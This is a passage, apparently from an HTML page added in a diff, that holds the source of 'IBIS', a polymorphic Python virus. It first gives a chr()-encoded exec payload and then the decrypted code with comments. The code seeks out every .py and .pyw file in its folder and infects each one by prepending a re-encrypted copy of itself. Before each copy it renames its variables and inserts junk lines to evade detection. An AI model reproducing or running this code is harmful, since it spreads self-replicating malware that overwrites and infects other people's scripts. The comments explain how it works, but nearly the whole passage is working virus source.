+chr(93)+chr(33)+chr(61)+chr(34)+chr(35)+chr(34)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(9)+chr(9)+chr(98)+chr(114)+chr(101)+chr(97)+chr(107)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(9)+chr(101)+chr(108)+chr(115)+chr(101)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(9)+chr(9)+chr(115)+chr(101)+chr(99)+chr(111)+chr(110)+chr(100)+chr(99)+chr(110)+chr(116)+chr(43)+chr(61)+chr(49)+chr(10)+chr(9)+chr(9)+chr(70)+chr(105)+chr(114)+chr(115)+chr(116)+chr(80)+chr(97)+chr(114)+chr(116)+chr(79)+chr(102)+chr(87)+chr(68)+chr(73)+chr(71)+chr(61)+chr(34)+chr(34)+chr(10)+chr(9)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(105)+chr(102)+chr(32)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(91)+chr(105)+chr(93)+chr(62)+chr(34)+chr(32)+chr(34)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(70)+chr(105)+chr(114)+chr(115)+chr(116)+chr(80)+chr(97)+chr(114)+chr(116)+chr(79)+chr(102)+chr(87)+chr(68)+chr(73)+chr(71)+chr(61)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(91)+chr(58)+chr(105)+chr(93)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(98)+chr(114)+chr(101)+chr(97)+chr(107)+chr(10)+chr(9)+chr(9)+chr(78)+chr(117)+chr(109)+chr(98)+chr(101)+chr(114)+chr(79)+chr(102)+chr(84)+chr(97)+chr(98)+chr(115)+chr(61)+chr(70)+chr(105)+chr(114)+chr(115)+chr(116)+chr(80)+chr(97)+chr(114)+chr(116)+chr(79)+chr(102)+chr(87)+chr(68)+chr(73)+chr(71)+chr(46)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(40)+chr(34)+chr(92)+chr(116)+chr(34)+chr(41)+chr(10)+chr(9)+chr(9)+chr(78)+chr(117)+chr(109)+chr(98)+chr(101)+chr(114)+chr(79)+chr(102)+chr(83)+chr(112)+chr(97)+chr(99)+chr(101)+chr(115)+chr(61)+chr(70)+chr(105)+chr(114)+chr(115)+chr(116)+chr(80)+chr(97)+chr(114)+chr(116)+chr(79)+chr(102)+chr(87)+chr(68)+chr(73)+chr(71)+chr(46)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(40)+chr(34)+chr(32)+chr(34)+chr(41)+chr(10)+chr(9)+chr(9)+chr(115)+chr(111)+chr(117)+chr(114)+chr(99)+chr(101)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(119)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(115)+chr(111)+chr(117)+chr(114)+chr(99)+chr(101)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(91)+chr(105)+chr(93)+chr(43)+chr(34)+chr(92)+chr(110)+chr(34)+chr(41)+chr(10)+chr(9)+chr(9)+chr(9)+chr(105)+chr(102)+chr(32)+chr(105)+chr(61)+chr(61)+chr(82)+chr(110)+chr(100)+chr(78)+chr(109)+chr(98)+chr(43)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(9)+chr(115)+chr(111)+chr(117)+chr(114)+chr(99)+chr(101)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(78)+chr(117)+chr(109)+chr(98)+chr(101)+chr(114)+chr(79)+chr(102)+chr(84)+chr(97)+chr(98)+chr(115)+chr(42)+chr(34)+chr(92)+chr(116)+chr(34)+chr(43)+chr(78)+chr(117)+chr(109)+chr(98)+chr(101)+chr(114)+chr(79)+chr(102)+chr(83)+chr(112)+chr(97)+chr(99)+chr(101)+chr(115)+chr(42)+chr(34)+chr(32)+chr(34)+chr(43)+chr(83)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(91)+chr(114)+chr(97)+chr(110)+chr(100)+chr(105)+chr(110)+chr(116)+chr(40)+chr(48)+chr(44)+chr(49)+chr(41)+chr(93)+chr(43)+chr(34)+chr(92)+chr(110)+chr(34)+chr(41)+chr(10)+chr(9)+chr(9)+chr(115)+chr(111)+chr(117)+chr(114)+chr(99)+chr(101)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(86)+chr(97)+chr(114)+chr(105)+chr(97)+chr(98)+chr(108)+chr(101)+chr(115)+chr(61)+chr(91)+chr(34)+chr(86)+chr(97)+chr(114)+chr(105)+chr(97)+chr(98)+chr(108)+chr(101)+chr(115)+chr(34)+chr(44)+chr(32)+chr(34)+chr(109)+chr(121)+chr(115)+chr(111)+chr(117)+chr(108)+chr(34)+chr(44)+chr(32)+chr(34)+chr(99)+chr(118)+chr(98)+chr(110)+chr(109)+chr(34)+chr(44)+chr(32)+chr(34)+chr(84)+chr(109)+chr(112)+chr(70)+chr(105)+chr(108)+chr(101)+chr(34)+chr(44)+chr(32)+chr(34)+chr(68)+chr(70)+chr(71)+chr(72)+chr(74)+chr(34)+chr(44)+chr(32)+chr(34)+chr(97)+chr(115)+chr(100)+chr(102)+chr(103)+chr(34)+chr(44)+chr(32)+chr(34)+chr(98)+chr(104)+chr(110)+chr(106)+chr(109)+chr(34)+chr(44)+chr(32)+chr(34)+chr(72)+chr(111)+chr(115)+chr(116)+chr(102)+chr(105)+chr(108)+chr(101)+chr(115)+chr(34)+chr(44)+chr(32)+chr(34)+chr(72)+chr(111)+chr(115)+chr(116)+chr(120)+chr(34)+chr(44)+chr(32)+chr(34)+chr(72)+chr(67)+chr(111)+chr(100)+chr(101)+chr(34)+chr(44)+chr(32)+chr(34)+chr(72)+chr(101)+chr(108)+chr(108)+chr(111)+chr(34)+chr(44)+chr(32)+chr(34)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(70)+chr(105)+chr(108)+chr(101)+chr(34)+chr(32)+chr(44)+chr(34)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(67)+chr(111)+chr(100)+chr(101)+chr(34)+chr(44)+chr(32)+chr(34)+chr(78)+chr(101)+chr(119)+chr(86)+chr(121)+chr(34)+chr(44)+chr(32)+chr(34)+chr(83)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(34)+chr(44)+chr(32)+chr(34)+chr(67)+chr(111)+chr(100)+chr(101)+chr(87)+chr(105)+chr(116)+chr(104)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(34)+chr(44)+chr(32)+chr(34)+chr(115)+chr(111)+chr(117)+chr(114)+chr(99)+chr(101)+chr(34)+chr(44)+chr(32)+chr(34)+chr(115)+chr(114)+chr(99)+chr(99)+chr(111)+chr(100)+chr(101)+chr(34)+chr(44)+chr(32)+chr(34)+chr(82)+chr(110)+chr(100)+chr(78)+chr(109)+chr(98)+chr(34)+chr(44)+chr(32)+chr(34)+chr(99)+chr(111)+chr(117)+chr(110)+chr(116)+chr(101)+chr(114)+chr(34)+chr(44)+chr(32)+chr(34)+chr(87)+chr(104)+chr(101)+chr(114)+chr(101)+chr(68)+chr(111)+chr(73)+chr(71)+chr(111)+chr(34)+chr(44)+chr(32)+chr(34)+chr(70)+chr(105)+chr(114)+chr(115)+chr(116)+chr(80)+chr(97)+chr(114)+chr(116)+chr(79)+chr(102)+chr(87)+chr(68)+chr(73)+chr(71)+chr(34)+chr(44)+chr(32)+chr(34)+chr(78)+chr(117)+chr(109)+chr(98)+chr(101)+chr(114)+chr(79)+chr(102)+chr(84)+chr(97)+chr(98)+chr(115)+chr(34)+chr(44)+chr(32)+chr(34)+chr(78)+chr(117)+chr(109)+chr(98)+chr(101)+chr(114)+chr(79)+chr(102)+chr(83)+chr(112)+chr(97)+chr(99)+chr(101)+chr(115)+chr(34)+chr(44)+chr(32)+chr(34)+chr(115)+chr(101)+chr(99)+chr(111)+chr(110)+chr(100)+chr(99)+chr(110)+chr(116)+chr(34)+chr(93)+chr(10)+chr(83)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(61)+chr(40)+chr(34)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(69)+chr(120)+chr(97)+chr(109)+chr(112)+chr(108)+chr(101)+chr(49)+chr(61)+chr(92)+chr(34)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(69)+chr(120)+chr(97)+chr(109)+chr(112)+chr(108)+chr(101)+chr(49)+chr(92)+chr(34)+chr(34)+chr(44)+chr(34)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(69)+chr(120)+chr(97)+chr(109)+chr(112)+chr(108)+chr(101)+chr(50)+chr(61)+chr(92)+chr(34)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(69)+chr(120)+chr(97)+chr(109)+chr(112)+chr(108)+chr(101)+chr(50)+chr(92)+chr(34)+chr(34)+chr(41)+chr(10)+chr(72)+chr(111)+chr(115)+chr(116)+chr(102)+chr(105)+chr(108)+chr(101)+chr(115)+chr(61)+chr(103)+chr(108)+chr(111)+chr(98)+chr(46)+chr(103)+chr(108)+chr(111)+chr(98)+chr(40)+chr(34)+chr(42)+chr(46)+chr(112)+chr(121)+chr(34)+chr(41)+chr(43)+chr(103)+chr(108)+chr(111)+chr(98)+chr(46)+chr(103)+chr(108)+chr(111)+chr(98)+chr(40)+chr(34)+chr(42)+chr(46)+chr(112)+chr(121)+chr(119)+chr(34)+chr(41)+chr(10)+chr(102)+chr(111)+chr(114)+chr(32)+chr(72)+chr(111)+chr(115)+chr(116)+chr(102)+chr(105)+chr(108)+chr(101)+chr(115)+chr(32)+chr(105)+chr(110)+chr(32)+chr(72)+chr(111)+chr(115)+chr(116)+chr(102)+chr(105)+chr(108)+chr(101)+chr(115)+chr(58)+chr(10)+chr(9)+chr(72)+chr(111)+chr(115)+chr(116)+chr(120)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(72)+chr(111)+chr(115)+chr(116)+chr(102)+chr(105)+chr(108)+chr(101)+chr(115)+chr(44)+chr(34)+chr(114)+chr(98)+chr(34)+chr(41)+chr(32)+chr(10)+chr(9)+chr(72)+chr(67)+chr(111)+chr(100)+chr(101)+chr(61)+chr(72)+chr(111)+chr(115)+chr(116)+chr(120)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(10)+chr(9)+chr(72)+chr(111)+chr(115)+chr(116)+chr(120)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(32)+chr(10)+chr(9)+chr(105)+chr(102)+chr(32)+chr(102)+chr(105)+chr(110)+chr(100)+chr(40)+chr(72)+chr(67)+chr(111)+chr(100)+chr(101)+chr(44)+chr(34)+chr(73)+chr(66)+chr(73)+chr(83)+chr(34)+chr(41)+chr(61)+chr(61)+chr(45)+chr(49)+chr(58)+chr(10)+chr(9)+chr(9)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(105)+chr(111)+chr(110)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(67)+chr(108)+chr(101)+chr(97)+chr(110)+chr(101)+chr(114)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(70)+chr(105)+chr(108)+chr(101)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(102)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(114)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(9)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(67)+chr(111)+chr(100)+chr(101)+chr(61)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(48)+chr(44)+chr(108)+chr(101)+chr(110)+chr(40)+chr(86)+chr(97)+chr(114)+chr(105)+chr(97)+chr(98)+chr(108)+chr(101)+chr(115)+chr(41)+chr(44)+chr(49)+chr(41)+chr(58)+chr(10)+chr(9)+chr(9)+chr(9)+chr(78)+chr(101)+chr(119)+chr(86)+chr(121)+chr(61)+chr(78)+chr(101)+chr(119)+chr(86)+chr(97)+chr(114)+chr(105)+chr(97)+chr(98)+chr(108)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(9)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(67)+chr(111)+chr(100)+chr(101)+chr(61)+chr(115)+chr(117)+chr(98)+chr(40)+chr(86)+chr(97)+chr(114)+chr(105)+chr(97)+chr(98)+chr(108)+chr(101)+chr(115)+chr(91)+chr(105)+chr(93)+chr(44)+chr(78)+chr(101)+chr(119)+chr(86)+chr(121)+chr(44)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(67)+chr(111)+chr(100)+chr(101)+chr(41)+chr(10)+chr(9)+chr(9)+chr(9)+chr(86)+chr(97)+chr(114)+chr(105)+chr(97)+chr(98)+chr(108)+chr(101)+chr(115)+chr(91)+chr(105)+chr(93)+chr(61)+chr(78)+chr(101)+chr(119)+chr(86)+chr(121)+chr(10)+chr(9)+chr(9)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(70)+chr(105)+chr(108)+chr(101)+chr(61)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(84)+chr(101)+chr(109)+chr(112)+chr(102)+chr(105)+chr(108)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(44)+chr(34)+chr(119)+chr(98)+chr(34)+chr(41)+chr(10)+chr(9)+chr(9)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(119)+chr(114)+chr(105)+chr(116)+chr(101)+chr(40)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(67)+chr(111)+chr(100)+chr(101)+chr(41)+chr(10)+chr(9)+chr(9)+chr(68)+chr(101)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(101)+chr(100)+chr(70)+chr(105)+chr(108)+chr(101)+chr(46)+chr(99)+chr(108)+chr(111)+chr(115)+chr(101)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(78)+chr(101)+chr(119)+chr(84)+chr(114)+chr(97)+chr(115)+chr(104)+chr(40)+chr(41)+chr(10)+chr(9)+chr(9)+chr(69)+chr(110)+chr(99)+chr(114)+chr(121)+chr(112)+chr(116)+chr(105)+chr(111)+chr(110)+chr(40)+chr(41))
+#IBIS
+
+# Decrypted code (with comments added) ###########################
+
+import sys, glob
+from os import remove
+from string import *
+from re import *
+from random import *
+
+##################################################################
+
+def Decryption():
+	mysoul=open(sys.argv[0],"rb") 
+	cvbnm=mysoul.readline()        
+	mysoul.close()
+
+	cvbnm=cvbnm[find(cvbnm,"eval(")+6:]
+	cvbnm=cvbnm[:find(cvbnm,"))")+1]     # It remains only crypted code
+
+	cvbnm=split("\+",cvbnm,0)            # Creates a list of crypted characters
+
+	TmpFile=open("TempFile.txt","w")
+	for i in range(0,len(cvbnm),1):
+		TmpFile.write(chr(ord(eval(cvbnm[i]))))
+	
+	TmpFile.close()                      # Writes the decrypted code in a temp file
+
+
+##################################################################
+
+def Encryption():
+	DFGHJ=open("TempFile.txt","rb")
+	asdfg=DFGHJ.read()
+	DFGHJ.close()
+	bhnjm=[0]
+	for i in range(0,len(asdfg)-1,1):
+		bhnjm[len(bhnjm):]=[0]
+
+	for i in range(0,len(asdfg),1):
+		bhnjm[i]="chr("+str(ord(asdfg[i]))+")+" # crypts the code
+
+	DFGHJ=open("TempFile.txt","w")
+	DFGHJ.write("exec(")
+	for i in range(0,len(bhnjm),1):
+		if i==len(bhnjm)-1:
+			cvbnm=str(bhnjm[i])
+			DFGHJ.write(cvbnm[:len(cvbnm)-1])
+		else:
+			DFGHJ.write(str(bhnjm[i]))
+
+		
+	DFGHJ.write(")")
+	DFGHJ.close()
+
+	DFGHJ=open("TempFile.txt","rb")
+	asdfg=DFGHJ.read()
+	DFGHJ.close()
+	asdfg=sub("\+chr\(13\)","",asdfg)    # delete all the carriages return
+	
+	remove("TempFile.txt")               # delete the temp file
+
+	Hostx=open(Hostfiles,"wb")
+		
+	Hello=asdfg+"\n#IBIS\n"+HCode        # writes its own code,
+		                             # its name and the victim's code
+	Hostx.write(Hello)
+	Hostx.close()
+
+##################################################################
+
+def NewVariable():
+	NewVy = chr(randint(97,122))+chr(randint(97,122))+chr(randint(97,122))+chr(randint(97,122))+chr(randint(97,122))+chr(randint(97,122))+chr(randint(97,122))+chr(randint(97,122))
+	
+	if find(DecryptedCode,NewVy)!=-1:     # if the new variable already exists
+		NewVariable()
+	else:
+		return NewVy
+
+
+##################################################################
+
+def TrashCleaner():
+	DFGHJ=open("TempFile.txt","rb")
+	CodeWithTrash=DFGHJ.read()
+	DFGHJ.close()
+
+	CodeWithTrash=split("\n",CodeWithTrash,0)
+
+	for i in range(0,len(CodeWithTrash),1):
+		if find(CodeWithTrash[i],STrash[0])!=-1 or find(CodeWithTrash[i],STrash[1])!=-1:
+			CodeWithTrash[i]="*"  # Searches for garbage intructions lines
+                                              # and marks them
+	DFGHJ=open("TempFile.txt","wb")
+	for i in range(0,len(CodeWithTrash),1):
+		if CodeWithTrash[i]!="*":
+			DFGHJ.write(CodeWithTrash[i]+"\n") 
+
+	DFGHJ.close()                         # now the code is without trash
+
+##################################################################
+
+def NewTrash():
+	for i in range(0,randint(1,20),1):           # how much trash ?
+		source=open("TempFile.txt","rb")
+		srccode=source.read()
+		source.close()
+
+		srccode=split("\n",srccode,0)
+
+		RndNmb=randint(0,len(srccode)-1)    
+
+		counter=0
+		
+		WhereDoIGo=srccode[RndNmb]           # and where ?          
+		while (find(WhereDoIGo,"#")!=-1 or WhereDoIGo=="\n") and RndNmb+counter<len(srccode):
+			WhereDoIGo=srccode[RndNmb+counter]
+			counter+=1                   # this is for the comments 
+		                                     # and for the newlines
+		counter-=1
+		secondcnt=1 		
+		
+		if len(WhereDoIGo)>1:
+			if WhereDoIGo[len(WhereDoIGo)-2]==":":
+				while RndNmb+counter+secondcnt<len(srccode):
+					WhereDoIGo=srccode[RndNmb+counter+secondcnt]
+					if WhereDoIGo[0]!="#":
+						break
+					else:
+						secondcnt+=1   # other checks
+
+		FirstPartOfWDIG=""
+		for i in range(0,len(WhereDoIGo),1):
+			if WhereDoIGo[i]>" ":
+				FirstPartOfWDIG=WhereDoIGo[:i]
+				break
+
+		NumberOfTabs=FirstPartOfWDIG.count("\t")
+		NumberOfSpaces=FirstPartOfWDIG.count(" ")   # Indentation !
+
+		source=open("TempFile.txt","wb")
+		for i in range(0,len(srccode),1):
+			source.write(srccode[i]+"\n")
+			if i==RndNmb+counter:
+				source.write(NumberOfTabs*"\t"+NumberOfSpaces*" "+STrash[randint(0,1)]+"\n")         
+
+		
+		source.close()
+
+##################################################################
+
+Variables=["Variables", "mysoul", "cvbnm", "TmpFile", "DFGHJ", "asdfg", "bhnjm", "Hostfiles", "Hostx", "HCode", "Hello", "DecryptedFile" ,"DecryptedCode", "NewVy", "STrash", "CodeWithTrash", "source", "srccode", "RndNmb", "counter", "WhereDoIGo", "FirstPartOfWDIG", "NumberOfTabs", "NumberOfSpaces", "secondcnt"]  # Variables to modify
+
+STrash=("TrashExample1=\"TrashExample1\"","TrashExample2=\"TrashExample2\"")  # Trash
+
+
+Hostfiles=glob.glob("*.py")+glob.glob("*.pyw")
+
+for Hostfiles in Hostfiles:
+	Hostx=open(Hostfiles,"rb") 
+	HCode=Hostx.read()
+	Hostx.close() 
+	
+	if find(HCode,"IBIS")==-1:     # If the victim is already infected
+		Decryption()
+		TrashCleaner()
+
+		DecryptedFile=open("Tempfile.txt","rb")
+		DecryptedCode=DecryptedFile.read()
+		DecryptedFile.close()
+		
+
+		for i in range(0,len(Variables),1):
+			NewVy=NewVariable()
+			DecryptedCode=sub(Variables[i],NewVy,DecryptedCode)
+			Variables[i]=NewVy              # changes variables
+
+		DecryptedFile=open("Tempfile.txt","wb")
+		DecryptedFile.write(DecryptedCode)
+		DecryptedFile.close()
+
+		NewTrash()
+		Encryption()
+
+# End #############################################################
+
+</xmp>
+</div>
+
+</body>
+</html>
